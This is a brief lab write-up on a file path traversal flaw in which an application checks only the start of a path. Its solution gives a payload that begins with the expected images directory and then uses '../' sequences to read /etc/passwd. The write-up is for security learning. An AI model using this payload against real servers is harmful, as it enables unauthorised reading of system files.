# Lab 5: File Path Traversal – Validation of Start of Path

## 📝 Description

This lab involves a File Path Traversal vulnerability where the application attempts to validate file paths by checking only the start of the input.

By cleverly manipulating the input, attackers can bypass this validation and access arbitrary files.

## 🎯 Objective
- Understand how weak start-of-path validation can be bypassed.

- Craft payloads to trick the application’s path checks.

- Access sensitive files like /etc/passwd.

## Solution

<img width="1366" height="389" alt="Screenshot (798)" src="https://github.com/user-attachments/assets/3cef913b-311d-433a-8905-e2bf18b899a8" />

```
<img src="/images/filename=/var/www/images/../../../etc/passwd">
```
